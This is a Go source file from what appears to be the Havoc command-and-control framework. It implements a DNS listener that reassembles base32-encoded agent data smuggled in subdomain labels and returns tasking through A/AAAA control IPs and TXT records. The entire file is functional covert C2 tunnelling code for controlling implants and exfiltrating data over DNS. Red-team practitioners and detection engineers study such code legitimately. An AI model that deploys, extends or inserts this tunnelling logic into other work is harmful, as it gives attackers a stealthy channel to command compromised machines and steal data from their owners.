package handlers

import (
	"bytes"
	"encoding/base32"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"Havoc/pkg/colors"
	"Havoc/pkg/logger"

	"github.com/miekg/dns"
)

// DNS-safe base32 encoding (lowercase, no padding)
var dnsBase32Encoding = base32.NewEncoding("abcdefghijklmnopqrstuvwxyz234567").WithPadding(base32.NoPadding)

// DNS control A-record responses
var (
	dnsCtrlAck    = net.ParseIP("1.0.0.1") // ACK
	dnsCtrlHasJob = net.ParseIP("1.0.0.2") // has pending job
	dnsCtrlNoJob  = net.ParseIP("1.0.0.0") // no job
)

func NewConfigDns() *DNS {
	d := new(DNS)
	d.sessions = make(map[string]*dnsSession)
	d.Config.PortBind = "53"
	d.Config.RecordType = "A/TXT"
	d.Config.PollInterval = 60
	d.Config.TTL = 5
	return d
}

type dnsSession struct {
	chunks   map[int][]byte
	total    int
	lastSeen time.Time
	response []byte // pending response for this agent
}

/* ===========================================================
 *  Start / Stop
 * =========================================================== */

func (d *DNS) Start() {
	logger.Debug("Setup DNS Server")

	if d.Config.Domain == "" || d.Config.Name == "" {
		logger.Error("DNS Domain/Name not set")
		return
	}

	d.Active = true

	// Ensure domain has no trailing dot for matching, but register with dot
	domain := strings.TrimSuffix(d.Config.Domain, ".")
	dns.HandleFunc(domain+".", d.handleDNS)

	addr := ":" + d.Config.PortBind
	d.Server = &dns.Server{Addr: addr, Net: "udp"}

	logger.Info("Started \"" + colors.Green(d.Config.Name) + "\" listener: " + colors.BlueUnderline("dns://"+d.Config.Domain+addr))

	pk := d.Teamserver.ListenerAdd("", LISTENER_DNS, d)
	d.Teamserver.EventAppend(pk)
	d.Teamserver.EventBroadcast("", pk)

	// session cleanup
	go d.cleanupLoop()

	go func() {
		if err := d.Server.ListenAndServe(); err != nil {
			logger.Error("DNS server error: " + err.Error())
			d.Active = false
			d.Teamserver.EventListenerError(d.Config.Name, err)
		}
	}()
}

func (d *DNS) Stop() error {
	d.Active = false
	domain := strings.TrimSuffix(d.Config.Domain, ".") + "."
	dns.HandleRemove(domain)
	if d.Server != nil {
		return d.Server.Shutdown()
	}
	return nil
}

func (d *DNS) cleanupLoop() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		if !d.Active {
			return
		}
		d.mu.Lock()
		now := time.Now()
		for id, s := range d.sessions {
			if now.Sub(s.lastSeen) > 60*time.Second {
				delete(d.sessions, id)
			}
		}
		d.mu.Unlock()
	}
}

/* ===========================================================
 *  DNS Handler — the main entry point for every query
 * =========================================================== */

func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	if !d.Active || len(r.Question) == 0 {
		return
	}

	qname := r.Question[0].Name // e.g. "mfxw6.0.1.deadbeef.c2.example.com."
	qtype := r.Question[0].Qtype

	// Strip our domain suffix to get the subdomain portion
	domainDot := strings.TrimSuffix(d.Config.Domain, ".") + "."
	if !strings.HasSuffix(qname, "."+domainDot) {
		// Bare domain query → SOA
		d.replySOA(w, r)
		return
	}
	sub := strings.TrimSuffix(qname, "."+domainDot) // "mfxw6.0.1.deadbeef"

	// Parse subdomain labels: <data_labels...>.<seq>.<total>.<agent_id_hex>
	labels := strings.Split(sub, ".")
	if len(labels) < 3 {
		d.replyNXDOMAIN(w, r)
		return
	}

	agentHex := labels[len(labels)-1]
	totalStr := labels[len(labels)-2]
	seqStr := labels[len(labels)-3]
	dataLabels := labels[:len(labels)-3]

	seq, err1 := strconv.Atoi(seqStr)
	total, err2 := strconv.Atoi(totalStr)
	if err1 != nil || err2 != nil || total <= 0 || seq < 0 || seq >= total {
		d.replyNXDOMAIN(w, r)
		return
	}

	// Decode base32 data from concatenated data labels
	b32 := strings.Join(dataLabels, "")
	chunkData, err := dnsBase32Encoding.DecodeString(strings.ToLower(b32))
	if err != nil {
		logger.Debug(fmt.Sprintf("DNS base32 decode error: %v", err))
		d.replyNXDOMAIN(w, r)
		return
	}

	// Get external IP
	externalIP := ""
	if addr := w.RemoteAddr(); addr != nil {
		externalIP = strings.Split(addr.String(), ":")[0]
	}

	d.mu.Lock()
	defer d.mu.Unlock()

	session, exists := d.sessions[agentHex]
	if !exists {
		session = &dnsSession{
			chunks: make(map[int][]byte),
			total:  total,
		}
		d.sessions[agentHex] = session
	}
	session.lastSeen = time.Now()
	session.total = total

	// Store chunk
	session.chunks[seq] = chunkData

	// Check if all chunks received
	if len(session.chunks) < total {
		// Still waiting for more chunks — ACK this one
		d.replyControl(w, r, dnsCtrlAck)
		return
	}

	// Reassemble full payload
	var assembled bytes.Buffer
	for i := 0; i < total; i++ {
		if chunk, ok := session.chunks[i]; ok {
			assembled.Write(chunk)
		}
	}
	// Clear chunks
	session.chunks = make(map[int][]byte)

	// Pass to the shared agent request parser (same as HTTP handler)
	body := assembled.Bytes()
	response, success := parseAgentRequest(d.Teamserver, body, externalIP)

	if !success {
		logger.Debug("DNS: parseAgentRequest failed for agent " + agentHex)
		d.replyControl(w, r, dnsCtrlNoJob)
		return
	}

	respBytes := response.Bytes()

	if len(respBytes) == 0 || qtype == dns.TypeA || qtype == dns.TypeAAAA {
		// No response data or agent asked via A/AAAA record — send control response
		d.replyControl(w, r, dnsCtrlAck)
		// Store response for later TXT retrieval
		if len(respBytes) > 0 {
			session.response = respBytes
		}
		return
	}

	// Send response as TXT records
	d.replyTXT(w, r, respBytes)
}

/* ===========================================================
 *  Reply helpers
 * =========================================================== */

// replyControl sends a control IP via A or AAAA depending on RecordType config.
func (d *DNS) replyControl(w dns.ResponseWriter, r *dns.Msg, ip net.IP) {
	if d.Config.RecordType == "AAAA/TXT" {
		d.replyAAAA(w, r, ip)
	} else {
		d.replyA(w, r, ip)
	}
}

func (d *DNS) replyA(w dns.ResponseWriter, r *dns.Msg, ip net.IP) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Answer = append(m.Answer, &dns.A{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    d.Config.TTL,
		},
		A: ip,
	})
	w.WriteMsg(m)
}

func (d *DNS) replyAAAA(w dns.ResponseWriter, r *dns.Msg, ip net.IP) {
	m := new(dns.Msg)
	m.SetReply(r)
	// Map IPv4 control IP to IPv6 (e.g. 1.0.0.1 → ::1:0:0:1)
	ip6 := make(net.IP, net.IPv6len)
	copy(ip6[12:], ip.To4())
	m.Answer = append(m.Answer, &dns.AAAA{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeAAAA,
			Class:  dns.ClassINET,
			Ttl:    d.Config.TTL,
		},
		AAAA: ip6,
	})
	w.WriteMsg(m)
}

func (d *DNS) replyTXT(w dns.ResponseWriter, r *dns.Msg, data []byte) {
	m := new(dns.Msg)
	m.SetReply(r)

	encoded := dnsBase32Encoding.EncodeToString(data)

	// Split into TXT strings of max 255 chars each
	var txts []string
	for len(encoded) > 0 {
		chunk := encoded
		if len(chunk) > 255 {
			chunk = encoded[:255]
		}
		txts = append(txts, chunk)
		encoded = encoded[len(chunk):]
	}

	m.Answer = append(m.Answer, &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    d.Config.TTL,
		},
		Txt: txts,
	})
	w.WriteMsg(m)
}

func (d *DNS) replySOA(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	domain := strings.TrimSuffix(d.Config.Domain, ".") + "."
	m.Ns = append(m.Ns, &dns.SOA{
		Hdr: dns.RR_Header{
			Name:   domain,
			Rrtype: dns.TypeSOA,
			Class:  dns.ClassINET,
			Ttl:    d.Config.TTL,
		},
		Ns:      "ns1." + domain,
		Mbox:    "admin." + domain,
		Serial:  uint32(time.Now().Unix()),
		Refresh: 3600,
		Retry:   1800,
		Expire:  604800,
		Minttl:  86400,
	})
	w.WriteMsg(m)
}

func (d *DNS) replyNXDOMAIN(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Rcode = dns.RcodeNameError
	w.WriteMsg(m)
}
